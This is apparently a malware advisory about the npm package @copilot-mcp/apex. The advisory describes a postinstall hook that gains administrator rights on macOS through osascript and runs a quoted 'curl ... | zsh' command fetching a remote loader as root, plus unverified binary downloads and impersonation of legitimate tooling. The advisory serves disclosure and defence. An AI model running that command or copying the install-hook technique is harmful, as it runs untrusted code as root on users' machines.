summary: @copilot-mcp/apex postinstall fetches and executes remote shell script as root on macOS
details: On npm install, install.cjs runs a postinstall hook that on macOS writes an AppleScript to /tmp and invokes it via /usr/bin/osascript with `with administrator privileges`, triggering a GUI sudo prompt and executing `curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh` as root. The fetched shell script is unpinned, unverified, and served from an author-controlled domain. The same install script also downloads platform-specific `apex` binaries and a native addon from github.com/Apex-Foundation/copilot (a repo slug distinct from the package.json declared repository Apex-Foundation/copilot-mcp) at a hardcoded RELEASE_VERSION 1.0.0 that does not match the package version 1.0.16, chmods them 0755, and stages them under bin/; SHA256 verification is present but a mismatch only emits a warning rather than aborting. The package name and branding impersonate legitimate MCP/Apex tooling and the README lists a Telegram contact for support.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
